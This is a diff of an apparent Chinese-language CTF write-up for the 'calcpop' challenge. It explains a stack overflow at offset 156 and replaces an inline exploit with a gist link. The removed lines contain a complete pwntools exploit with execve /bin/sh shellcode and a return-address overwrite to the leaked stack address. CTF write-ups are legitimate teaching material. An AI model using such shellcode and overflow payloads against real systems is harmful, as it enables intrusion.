@@ -75,27 +75,5 @@ Pattern 0x41326641 first occurrence at position 156 in pattern.
 main() 函数返回地址在 offset 为 156 的位置。然后借由程序返回的栈地址，可以直接执行栈中的 shellcode.
 
 exp 如下:
-{% highlight python %}
-#!/usr/bin/env python
-# coding=utf8
 
-from pwn import process, p32, remote
-
-p = process("./calcpop")
-#p = remote('calcpop-4gh07blg.9447.plumbing', 9447)
-
-print p.recvline()
-
-p.send('get_stack_address\n')
-line = p.recvline()
-stack_addr = int(line.split()[-1][2:], 16)
-
-shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
-             "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
-
-payload = 'A' * 156 + p32(stack_addr + 156 + 4) + shellcode + '\n'
-
-p.send(payload)
-p.send('exit\n')
-p.interactive()
-{% endhighlight %}
+{% gist cubarco/ee054809d1643602b844 %}
